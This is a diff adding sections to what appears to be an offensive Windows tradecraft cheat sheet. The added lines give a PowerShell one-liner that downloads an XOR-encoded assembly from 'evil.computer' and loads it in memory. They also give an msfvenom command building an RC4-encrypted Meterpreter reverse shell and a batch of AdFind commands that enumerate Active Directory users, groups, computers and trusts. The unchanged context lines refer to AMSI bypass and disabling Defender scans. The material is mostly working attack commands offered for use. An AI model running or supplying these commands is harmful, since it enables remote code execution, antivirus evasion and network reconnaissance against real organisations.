@@ -94,6 +94,17 @@ PS > [MonkStager.MonkStager]::Execute()
 
 __Note:__ .NET 4.8, Assembly.Load is AMSI-aware 🚩
 
+### Load remote .NET assembly with PowerShell
+
+```powershell 
+
+$wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
+$k="XOR\_KEY";$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://evil.computer/malware.exe")))|%{$_-bxor$k[$i++%$k.length]}
+[System.Reflection.Assembly]::Load($b) | Out-Null
+$parameters=@("arg1", "arg2")
+[namespace.Class]::Main($parameters)
+```
+
 
 
 ### 1) Powershell AMSI Bypass
@@ -416,3 +427,21 @@ Set-MpPreference -DisableCatchupFullScan $True
 Set-MpPreference -DisableCatchupQuickScan $True
 ```
 
+#### Encryoted Msfvenom shellcode
+	```cpp
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
+	cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
+	xxd -i encmeter.bin
+	```
+
+#### AdFind Enumerations
+
+	```cpp
+	C:\Windows\system32\cmd.exe /C adfind.exe -gcb -sc trustdmp > trustdmp.txt
+	C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=group)" > ad_group.txt
+	C:\Windows\system32\cmd.exe /C adfind.exe -subnets -f (objectCategory=subnet)> subnets.txt
+	C:\Windows\system32\cmd.exe /C adfind.exe -sc trustdmp > trustdmp.txt
+	C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=organizationalUnit)" > ad_ous.txt
+	C:\Windows\system32\cmd.exe /C adfind.exe -f "objectcategory=computer" > ad_computers.txt
+	C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=person)" > ad_users.txt
+	```
